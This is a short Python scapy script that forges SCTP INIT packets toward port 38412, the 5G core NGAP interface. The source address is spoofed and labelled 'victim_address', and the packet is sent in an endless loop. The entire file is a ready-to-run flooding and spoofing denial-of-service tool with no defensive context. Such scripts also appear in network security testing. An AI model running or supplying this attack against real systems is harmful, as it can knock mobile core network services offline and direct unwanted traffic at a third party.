from scapy.all import sendp
from scapy.layers.inet import Ether, IP
from scapy.layers.sctp import SCTP, SCTPChunkInit
from random import randint

network_interface = "eth0"
victim_address = "192.0.2.3"
src_port = 40000
dst_address = "192.0.2.2"
dst_port = 38412

eth_ip = Ether() / IP(src=victim_address, dst=dst_address)
sctp = SCTP(sport=src_port, dport=dst_port, tag=0x0)

chunk_init = SCTPChunkInit(
    init_tag=randint(1, pow(2, 32) - 1),
    a_rwnd=pow(2, 16) - 1,
    n_in_streams=10,
    n_out_streams=10,
    init_tsn=randint(0, pow(2, 32) - 1)
)

init_pkt = eth_ip / sctp / chunk_init

while True:
    sendp(init_pkt, iface=network_interface)